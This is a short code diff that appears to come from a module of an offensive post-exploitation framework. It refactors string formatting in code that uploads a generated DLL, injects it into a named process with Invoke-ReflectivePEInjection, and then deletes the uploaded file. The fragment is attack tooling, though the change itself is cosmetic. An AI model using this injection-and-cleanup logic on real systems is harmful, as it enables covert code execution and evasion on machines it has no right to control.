@@ -70,9 +70,7 @@ class Module:
             else:
                 launcher_code = launcher.split(" ")[-1]
 
-                script_end += (
-                    f"Invoke-ReflectivePEInjection -PEPath {full_upload_path} -ProcName {proc_name} "
-                )
+                script_end += f"Invoke-ReflectivePEInjection -PEPath {full_upload_path} -ProcName {proc_name} "
                 dll = main_menu.stagergenv2.generate_dll(launcher_code, arch)
                 upload_script = main_menu.stagergenv2.generate_upload(
                     dll, full_upload_path
@@ -83,7 +81,7 @@ class Module:
                 script += "\r\n"
 
                 script_end += "\r\n"
-                script_end += "Remove-Item -Path %s" % full_upload_path
+                script_end += f"Remove-Item -Path {full_upload_path}"
 
                 script = main_menu.modulesv2.finalize_module(
                     script=script,
